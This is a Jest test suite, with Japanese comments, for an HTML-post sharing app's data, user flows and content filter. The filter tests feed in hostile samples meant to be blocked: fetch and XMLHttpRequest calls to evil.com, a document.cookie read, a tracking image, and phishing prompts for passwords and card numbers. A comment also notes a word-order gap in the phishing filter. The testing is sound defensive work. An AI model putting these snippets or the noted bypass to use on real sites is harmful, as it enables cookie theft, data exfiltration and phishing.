/**
 * 総合テストシナリオ
 *
 * カバー範囲:
 *   1. データ整合性 — posts / users / comments の外部キー的な参照が一貫しているか
 *   2. コンテンツフィルター境界値 — 通過・ブロックの境界が意図通りか
 *   3. ユーザーフロー — フィード閲覧 / 投稿詳細 / リミックス / 検索 の一連操作
 *   4. ビジネスルール — 統計値の上限・下限、タグ規約など
 */

import { POSTS, getPostById } from './posts';
import { USERS, getUserByName } from './users';
import { COMMENTS, getCommentsByPostId } from './comments';
import { checkContent } from './content-filter';

// ─── 1. データ整合性 ────────────────────────────────────────────────────────

describe('[整合性] 投稿の author は USERS に存在する', () => {
  it('すべての投稿 author.name が USERS のキーに対応している', () => {
    POSTS.forEach((post) => {
      expect(USERS[post.author.name]).toBeDefined();
    });
  });

  it('author.initial が USERS.initial と一致する', () => {
    POSTS.forEach((post) => {
      const user = USERS[post.author.name];
      expect(post.author.initial).toBe(user.initial);
    });
  });
});

describe('[整合性] コメントの author は USERS に存在する', () => {
  it('すべてのコメント author.name が USERS のキーに対応している', () => {
    COMMENTS.forEach((comment) => {
      expect(USERS[comment.author.name]).toBeDefined();
    });
  });

  it('コメントの postId はすべて存在する投稿を指している', () => {
    const postIds = new Set(POSTS.map((p) => p.id));
    COMMENTS.forEach((comment) => {
      expect(postIds.has(comment.postId)).toBe(true);
    });
  });
});

describe('[整合性] コメント数と投稿データの関係', () => {
  it('コメントが存在する投稿IDはすべて POSTS にある', () => {
    const commentedPostIds = [...new Set(COMMENTS.map((c) => c.postId))];
    commentedPostIds.forEach((id) => {
      expect(getPostById(id)).toBeDefined();
    });
  });

  it('getCommentsByPostId は自分の postId だけを返す（全投稿で検証）', () => {
    POSTS.forEach((post) => {
      const comments = getCommentsByPostId(post.id);
      comments.forEach((c) => expect(c.postId).toBe(post.id));
    });
  });
});

// ─── 2. コンテンツフィルター境界値 ─────────────────────────────────────────

describe('[フィルター] 通過すべき境界値ケース', () => {
  it('パスワード言及のみ（入力を促さない）は通過', () => {
    const cases = [
      '<p>パスワードは定期的に変更しましょう</p>',
      '<p>8文字以上のパスワードを推奨します</p>',
      '<h2>パスワードのベストプラクティス</h2>',
    ];
    cases.forEach((html) => expect(checkContent(html)).toEqual({ ok: true }));
  });

  it('anime / animation キーワードは通過（hentai と混同しない）', () => {
    expect(checkContent('<p>anime style illustration</p>')).toEqual({ ok: true });
    expect(checkContent('<p>animation demo</p>')).toEqual({ ok: true });
  });

  it('rufu.dev ドメインへの fetch は通過', () => {
    const cases = [
      "<script>fetch('https://rufu.dev/api/likes', { method: 'POST' })</script>",
      '<script>fetch("https://rufu.dev/api/comments")</script>',
    ];
    cases.forEach((html) => expect(checkContent(html)).toEqual({ ok: true }));
  });

  it('Google Fonts の CDN リンクは通過', () => {
    expect(
      checkContent('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP">')
    ).toEqual({ ok: true });
    expect(
      checkContent("<style>@import url('https://fonts.googleapis.com/css2?family=Roboto');</style>")
    ).toEqual({ ok: true });
  });

  it('Base64 埋め込み画像・CSS 背景は通過', () => {
    expect(checkContent('<img src="data:image/png;base64,iVBORw0KGgo=">')).toEqual({ ok: true });
    expect(
      checkContent('<style>body { background-image: url("data:image/png;base64,abc123"); }</style>')
    ).toEqual({ ok: true });
  });

  it('ローカルパス / 相対パス画像は通過', () => {
    expect(checkContent('<img src="/assets/logo.png">')).toEqual({ ok: true });
    expect(checkContent('<img src="./images/hero.jpg">')).toEqual({ ok: true });
  });

  it('CSSグラデーション（URLなし）は通過', () => {
    expect(
      checkContent('<style>body { background: linear-gradient(135deg, #000, #00782F); }</style>')
    ).toEqual({ ok: true });
  });
});

describe('[フィルター] ブロックすべき境界値ケース', () => {
  it('http:// 画像もブロック（https:// と同様）', () => {
    const result = checkContent('<img src="http://evil.com/track.gif">');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toContain('外部URL');
  });

  it('属性が複数あっても外部 src を含む img はブロック', () => {
    const result = checkContent('<img class="hero" id="main" src="https://cdn.example.com/img.png" alt="x">');
    expect(result.ok).toBe(false);
  });

  it('video / audio / source / embed の外部 src もブロック', () => {
    const cases = [
      '<video src="https://cdn.example.com/video.mp4">',
      '<audio src="https://cdn.example.com/audio.mp3">',
      '<video><source src="https://cdn.example.com/video.mp4" type="video/mp4"></video>',
      '<embed src="https://cdn.example.com/widget.swf">',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
    });
  });

  it('srcset に外部 URL を含む場合をブロック', () => {
    const result = checkContent(
      '<img srcset="https://example.com/small.jpg 480w, https://example.com/large.jpg 1024w">'
    );
    expect(result.ok).toBe(false);
  });

  it('object[data=https://...] をブロック', () => {
    const result = checkContent('<object data="https://example.com/embed.swf" type="application/x-shockwave-flash">');
    expect(result.ok).toBe(false);
  });

  it('CSS background: url(https://...) をブロック（引用符なし・あり両方）', () => {
    const cases = [
      '<style>.x { background: url(https://example.com/bg.jpg); }</style>',
      '<style>.x { background: url("https://example.com/bg.jpg"); }</style>',
      "<style>.x { background: url('https://example.com/bg.jpg'); }</style>",
      '<style>.x { background-image: url(https://example.com/bg.jpg); }</style>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
    });
  });

  it('rufu.dev 以外の外部 fetch はブロック', () => {
    const cases = [
      "<script>fetch('https://evil.com/steal')</script>",
      '<script>fetch("https://api.example.com/data")</script>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
    });
  });

  it('XMLHttpRequest はブロック', () => {
    const result = checkContent('<script>var xhr = new XMLHttpRequest(); xhr.open("GET","https://evil.com");</script>');
    expect(result.ok).toBe(false);
  });

  it('document.cookie アクセスをブロック', () => {
    const result = checkContent('<script>var c = document.cookie</script>');
    expect(result.ok).toBe(false);
  });

  it('アダルトキーワード（日英混在）をブロック', () => {
    const cases = [
      '<p>アダルトコンテンツです</p>',
      '<p>18禁です</p>',
      '<p>This is porn.</p>',
      '<p>hentai manga</p>',
      '<p>nude art</p>',
      '<p>adult content warning</p>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.reason).toContain('アダルト');
    });
  });

  it('スパム・詐欺キーワードをブロック', () => {
    const cases = [
      '<h1>副業で稼げる方法</h1>',
      '<p>1日5万円稼ぐ</p>',
      '<p>楽して稼ぎましょう</p>',
      '<p>出会い系サイト</p>',
      '<p>マルチ商法で稼ごう</p>',
      '<p>ネズミ講ビジネス</p>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.reason).toContain('スパム');
    });
  });

  it('フィッシング — パスワード入力を求めるコンテンツをブロック', () => {
    // フィルターパターン: (password|パスワード).{0,30}(input|enter|submit|入力)
    // — キーワードの後に動詞が続く語順のみ検出。語順逆（"enter your password"）は対象外。
    const cases = [
      '<p>パスワードを入力してください</p>',
      '<label>password: <input></label><button>submit</button>',
      '<p>password input here</p>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.reason).toContain('認証情報');
    });
  });

  it('フィッシング — クレジットカード入力を求めるコンテンツをブロック', () => {
    const cases = [
      '<p>クレジットカード番号を入力してください</p>',
      '<p>カード番号を入力</p>',
      '<label>card number: <input></label>',
    ];
    cases.forEach((html) => {
      const result = checkContent(html);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.reason).toContain('金融情報');
    });
  });
});

describe('[フィルター] 既存モックデータはすべて通過する', () => {
  it('POSTS の htmlContent は全件フィルターを通過する', () => {
    POSTS.forEach((post) => {
      const result = checkContent(post.htmlContent);
      expect(result).toEqual({ ok: true });
    });
  });
});

// ─── 3. ユーザーフロー ───────────────────────────────────────────────────────

describe('[フロー] フィード閲覧シナリオ', () => {
  it('フィード用に全投稿を取得できる（0件ではない）', () => {
    expect(POSTS.length).toBeGreaterThan(0);
  });

  it('いいね数降順で並べ替えられる', () => {
    const sorted = [...POSTS].sort((a, b) => b.likes - a.likes);
    expect(sorted[0].likes).toBeGreaterThanOrEqual(sorted[sorted.length - 1].likes);
  });

  it('タグ "ダッシュボード" でフィルターできる', () => {
    const filtered = POSTS.filter((p) => p.tags.includes('ダッシュボード'));
    expect(filtered.length).toBeGreaterThan(0);
    filtered.forEach((p) => expect(p.tags).toContain('ダッシュボード'));
  });

  it('タグ "ビジュアライゼーション" でフィルターできる', () => {
    const filtered = POSTS.filter((p) => p.tags.includes('ビジュアライゼーション'));
    expect(filtered.length).toBeGreaterThan(0);
  });

  it('存在しないタグでフィルターすると0件', () => {
    expect(POSTS.filter((p) => p.tags.includes('存在しないタグXYZ'))).toHaveLength(0);
  });
});

describe('[フロー] 検索シナリオ', () => {
  it('タイトルのキーワード検索が機能する', () => {
    const query = 'ダッシュボード';
    const results = POSTS.filter(
      (p) => p.title.includes(query) || p.tags.some((t) => t.includes(query))
    );
    expect(results.length).toBeGreaterThan(0);
  });

  it('大文字小文字を区別しないキーワード検索ができる', () => {
    const query = 'typescript';
    const results = POSTS.filter(
      (p) =>
        p.title.toLowerCase().includes(query.toLowerCase()) ||
        p.tags.some((t) => t.toLowerCase().includes(query.toLowerCase()))
    );
    expect(results.length).toBeGreaterThan(0);
  });

  it('著者名でフィルターできる', () => {
    const authorName = 'yamada_dev';
    const results = POSTS.filter((p) => p.author.name === authorName);
    expect(results.length).toBeGreaterThan(0);
    results.forEach((p) => expect(p.author.name).toBe(authorName));
  });

  it('マッチしないクエリは0件を返す', () => {
    const query = 'xyznotfound987';
    const results = POSTS.filter((p) => p.title.includes(query));
    expect(results).toHaveLength(0);
  });
});

describe('[フロー] 投稿詳細 + コメント表示シナリオ', () => {
  it('投稿1の詳細ページに必要なデータが揃っている', () => {
    const post = getPostById('1');
    expect(post).toBeDefined();
    expect(post?.htmlContent).toBeTruthy();

    const user = getUserByName(post!.author.name);
    expect(user).toBeDefined();

    const comments = getCommentsByPostId('1');
    expect(comments.length).toBeGreaterThan(0);
  });

  it('各コメントの author は USERS に存在する（詳細ページで著者プロフィールにリンクできる）', () => {
    const comments = getCommentsByPostId('1');
    comments.forEach((c) => {
      expect(getUserByName(c.author.name)).toBeDefined();
    });
  });

  it('htmlContent はフィルターを通過する（iframe 表示前の安全チェック）', () => {
    const post = getPostById('1');
    expect(checkContent(post!.htmlContent)).toEqual({ ok: true });
  });
});

describe('[フロー] リミックスシナリオ', () => {
  it('リミックス元の投稿から title / htmlContent / tags を引き継げる', () => {
    const source = getPostById('2'); // TypeScript スライド
    expect(source).toBeDefined();

    const remixDraft = {
      title: `[Remix] ${source!.title}`,
      htmlContent: source!.htmlContent,
      tags: [...source!.tags],
      remixSourceId: source!.id,
    };

    expect(remixDraft.title).toContain('[Remix]');
    expect(remixDraft.htmlContent).toBeTruthy();
    expect(remixDraft.tags).toEqual(source!.tags);
    expect(remixDraft.remixSourceId).toBe('2');
  });

  it('リミックスのコンテンツもフィルターを通過する', () => {
    const source = getPostById('2');
    expect(checkContent(source!.htmlContent)).toEqual({ ok: true });
  });
});

describe('[フロー] ユーザープロフィールシナリオ', () => {
  it('プロフィールページに必要な情報が揃っている', () => {
    const user = getUserByName('ai_watcher');
    expect(user).toBeDefined();
    expect(user?.displayName).toBeTruthy();
    expect(user?.bio).toBeTruthy();
    expect(user?.postCount).toBeGreaterThan(0);
    expect(user?.followers).toBeGreaterThanOrEqual(0);
    expect(user?.following).toBeGreaterThanOrEqual(0);
  });

  it('ユーザーの投稿一覧を author.name でフィルターできる', () => {
    const user = getUserByName('css_magic')!;
    const userPosts = POSTS.filter((p) => p.author.name === user.name);
    expect(userPosts.length).toBeGreaterThan(0);
    userPosts.forEach((p) => expect(p.author.name).toBe(user.name));
  });

  it('存在しないユーザーのプロフィールは undefined', () => {
    expect(getUserByName('ghost_user_xyz')).toBeUndefined();
  });
});

// ─── 4. ビジネスルール ───────────────────────────────────────────────────────

describe('[ビジネスルール] 統計値の健全性', () => {
  it('全投稿の likes は 0 より大きい', () => {
    POSTS.forEach((p) => expect(p.likes).toBeGreaterThan(0));
  });

  it('全投稿の views >= likes（閲覧数がいいね数以上）', () => {
    POSTS.forEach((p) => expect(p.views).toBeGreaterThanOrEqual(p.likes));
  });

  it('全投稿の bookmarks <= likes（ブックマーク数はいいね数以下）', () => {
    POSTS.forEach((p) => expect(p.bookmarks).toBeLessThanOrEqual(p.likes));
  });

  it('全ユーザーの postCount は 0 より大きい', () => {
    Object.values(USERS).forEach((u) => expect(u.postCount).toBeGreaterThan(0));
  });

  it('コメントの likes は 0 以上', () => {
    COMMENTS.forEach((c) => expect(c.likes).toBeGreaterThanOrEqual(0));
  });
});

describe('[ビジネスルール] タグの形式', () => {
  it('全投稿のタグは空でない文字列', () => {
    POSTS.forEach((post) => {
      post.tags.forEach((tag) => {
        expect(typeof tag).toBe('string');
        expect(tag.trim().length).toBeGreaterThan(0);
      });
    });
  });

  it('全投稿に最低1つのタグが付いている', () => {
    POSTS.forEach((post) => {
      expect(post.tags.length).toBeGreaterThanOrEqual(1);
    });
  });
});

describe('[ビジネスルール] HTML コンテンツの形式', () => {
  it('全投稿の htmlContent は DOCTYPE 宣言を含む', () => {
    POSTS.forEach((post) => {
      expect(post.htmlContent.toLowerCase()).toContain('<!doctype html>');
    });
  });

  it('全投稿の htmlContent は charset 指定を含む', () => {
    POSTS.forEach((post) => {
      expect(post.htmlContent.toLowerCase()).toContain('charset');
    });
  });
});

describe('[ビジネスルール] ユーザー initial の形式', () => {
  it('全ユーザーの initial は1文字の大文字', () => {
    Object.values(USERS).forEach((user) => {
      expect(user.initial).toHaveLength(1);
      expect(user.initial).toBe(user.initial.toUpperCase());
    });
  });
});
